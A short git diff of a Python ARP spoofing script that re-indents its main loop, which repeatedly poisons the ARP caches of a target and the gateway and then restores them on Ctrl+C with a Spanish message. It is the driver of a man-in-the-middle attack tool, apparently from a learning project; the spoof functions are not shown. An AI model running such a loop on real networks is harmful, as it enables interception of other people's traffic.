@@ -28,12 +28,12 @@ gateway_ip = "192.168.1.1"
 sent_packet_count = 0
 try:
     while True:
-    spoof(target_ip, gateway_ip)
-    spoof(gateway_ip, target_ip)
-    sent_packet_count = sent_packet_count + 2
-    print("\r[+] Packets sent: " + str(sent_packet_count),end="")
-    #sys.stdout.flush()
-    time.sleep(2)
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packet_count = sent_packet_count + 2
+        print("\r[+] Packets sent: " + str(sent_packet_count),end="")
+        #sys.stdout.flush()
+        time.sleep(2)
 except KeyboardInterrupt:
     print("[+] Detected CTRL +C .....Porvavor espera,limpiando tablas ARP ... Cerrando ARP spoofer")
     restore(target_ip, gateway_ip)
